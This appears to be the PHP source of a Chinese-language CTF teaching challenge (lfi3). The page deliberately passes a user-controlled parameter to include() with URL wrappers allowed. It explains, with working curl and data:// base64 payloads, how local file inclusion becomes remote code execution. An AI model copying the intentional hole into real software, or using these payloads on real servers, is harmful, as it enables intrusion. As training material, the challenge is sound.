<?php
// ============================================================
// lfi3 · php://input / data:// 执行代码
// 漏洞：include($_GET['page'])，且环境开启了 allow_url_include=On
// 考点：把"包含文件"升级为"执行任意代码"的两个经典包装器
// ============================================================
$page = isset($_GET['page']) ? $_GET['page'] : 'pages/home.php';
$included = null; $not_found = false;
if ($page !== '') {
    if (@file_exists($page) || preg_match('#^(php://|data://)#i', $page)) {
        ob_start();
        include($page);                        // ← 漏洞：可控 + 允许 URL 包装器
        $included = ob_get_clean();
    } else {
        $not_found = true;
    }
}
$allow_url_include = (bool)ini_get('allow_url_include');
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>lfi3 · php://input / data:// | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#22c55e;color:#04121f;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
input[type=text]{width:65%;min-width:220px;padding:8px 10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink)}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
.result{background:#0b1220;border:1px solid #27364d;border-radius:8px;margin-top:12px}
.result .t{padding:6px 12px;border-bottom:1px solid #27364d;color:var(--dim);font-size:12px}
.result pre{border:0;margin:0}
.errbox{background:#3b1519;border:1px solid #7f1d1d;color:#fca5a5;border-radius:8px;padding:10px 14px;margin-top:12px}
.warnbox{background:#3b2e09;border:1px solid #713f12;color:#fde68a;border-radius:8px;padding:10px 14px;margin:12px 0}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
.pages-nav a{color:var(--acc);text-decoration:none;margin-right:12px}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">文件包含 · 第 3 关</span>
<h1>v3 官网 —— 包含变成执行（php://input / data://）</h1>
<div class="meta">难度：★★☆☆☆ 进阶 | 关卡 ID：<code>lfi3</code> · 运行时：PHP（需 allow_url_include=On）</div>
</header>
<!-- OPS-CHECK: allow_url_include=<?= $allow_url_include ? 'On(OK)' : 'Off(本关不可解,需开)' ?> /flag_lfi3.txt <?= @file_exists('/flag_lfi3.txt')?'READY':'MISSING(复制 deploy/flag_lfi3.txt 到 /)' ?> -->

<?php if (!$allow_url_include): ?>
<div class="warnbox">⚠️ 当前 <code>allow_url_include=Off</code>，本关的两种解法都不会生效。<br>
集成提示：为本题容器设置 <code>php.ini</code>：<code>allow_url_include=On</code>（本地测试可用 <code>php -d allow_url_include=1 -S ...</code>）。这是本关的"实验环境设定"，真实生产环境此选项应保持 Off。</div>
<?php endif; ?>

<section class="card">
<h2>题目描述</h2>
<p>v3 的代码没怎么变（还是 <code>include($_GET['page'])</code>），但运维为了"调试方便"把 <code>allow_url_include</code> 打开了。从此包含的不只是本地文件——还有各种"流"。</p>
<p>目标：执行任意 PHP 代码，读到服务器根目录 <code>/flag_lfi3.txt</code> 的 flag。</p>
<nav class="pages-nav" style="margin-top:8px">
<a href="?page=pages/home.php">首页</a><a href="?page=pages/about.php">关于我们</a>
</nav>
</section>

<section class="card">
<h2>实验区</h2>
<form method="get" action="">
<label>page：<input type="text" name="page" placeholder="例如 pages/home.php" value="<?= htmlspecialchars($page, ENT_QUOTES) ?>"></label>
<button type="submit">打开</button>
</form>
<?php if ($not_found): ?>
<div class="errbox">⚠️ include: <code><?= htmlspecialchars($page, ENT_QUOTES) ?></code> 不存在</div>
<?php elseif ($included !== null): ?>
<div class="result"><div class="t">include('<?= htmlspecialchars($page, ENT_QUOTES) ?>') 的输出</div>
<pre><?= htmlspecialchars($included, ENT_QUOTES) ?></pre></div>
<?php endif; ?>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p>当 <code>allow_url_include=On</code> 时，include 可以接受 URL 型包装器，两个最经典：</p>
<table>
<tr><th>包装器</th><th>含义</th><th>用法</th></tr>
<tr><td><code>php://input</code></td><td>POST 请求的原始 body</td><td><code>?page=php://input</code> + POST body 写 PHP 代码</td></tr>
<tr><td><code>data://text/plain</code></td><td>内嵌数据的伪 URL</td><td><code>?page=data://text/plain,&lt;?php ...?&gt;</code>（明文）或 <code>;base64,...</code></td></tr>
</table>
<p><b>php://input</b>（要用 POST，body 就是代码）：</p>
<pre>curl -d "&lt;?php system('cat /flag_lfi3.txt');?&gt;" "http://HOST/lfi3/?page=php://input"</pre>
<p><b>data://</b>（GET 即可，注意 URL 编码；base64 形式最省事）：</p>
<pre>?page=data://text/plain,&lt;?php system('cat /flag_lfi3.txt');?&gt;          （需要 URL 编码）
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWdfbGZpMy50eHQnKTs/Pg==</pre>
<p>（上面这串 base64 就是 <code>&lt;?php system('cat /flag_lfi3.txt');?&gt;</code>）</p>
<p>两者的区别：php://input 代码在 POST body 里，不经过 URL 编码折腾，适合长 payload；data:// 一条 GET 链接搞定，浏览器地址栏直接用。对比 lfi1/lfi2：LFI 只能"读/包含已有文件"，而这两个包装器把 LFI 直接升级成了 <b>RCE</b>。</p>
</section>

<section class="card">
<h2>渐进提示</h2>
<details><summary>提示 1：环境开了什么？</summary><p>页面横幅会告诉你 <code>allow_url_include</code> 的状态。它是本关一切的前提——include 从此可以接受 <code>协议://</code> 开头的东西。</p></details>
<details><summary>提示 2：两个"无中生有"的流</summary><p><code>php://input</code> = 你 POST 的原始内容；<code>data://text/plain,...</code> = 你写在 URL 里的内容。让 include 把它们当 PHP 跑。</p></details>
<details><summary>提示 3：payload</summary><p>php://input（curl）：<br><code>curl -d "&lt;?php system('cat /flag_lfi3.txt');?&gt;" "http://HOST/lfi3/?page=php://input"</code><br>data://（GET）：<br><code>?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWdfbGZpMy50eHQnKTs/Pg==</code></p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="../lfi2">← 上一关：lfi2</a><a href="../lfi4">下一关：lfi4 · 日志包含 →</a></nav>
<footer>CTF Web 教学式靶场 · B 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=lfi3&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
